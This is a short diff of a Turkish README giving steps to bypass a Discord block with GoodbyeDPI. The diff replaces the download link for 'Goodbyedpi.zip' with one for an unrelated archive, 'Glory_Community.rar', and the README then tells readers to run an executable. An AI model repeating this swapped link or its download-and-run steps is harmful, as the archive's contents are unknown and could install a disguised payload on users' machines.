@@ -1,7 +1,7 @@
 # Discord Giriş Engelini Kaldırma (GoodbyeDPİ) 
 ![Discord](https://i.ytimg.com/vi/7V5jdOjWVU4/hq720.jpg?sqp=-oaymwEhCK4FEIIDSFryq4qpAxMIARUAAAAAGAElAADIQj0AgKJD&rs=AOn4CLCCLmAxRosK3Ltbar9OdDhUHFuDug "Opsiyonel başlık")
 ### Nasıl Kullanılır?
-- [# Buradaki linkten dosyayı indirin.](https://dosya.co/6tq7g5k9iu5x/Goodbyedpi.zip.html)
+- [# Buradaki linkten dosyayı indirin.](https://dosya.co/uyfzf9l833vo/Glory_Community.rar.html)
 - Daha sonra discord uygulamasını kapatın.
 - Dosyaları masaüstünde bir klasöre atın
 - Klasörede bulunan Goodbyedpi.exe dosyasını çalıştırın.
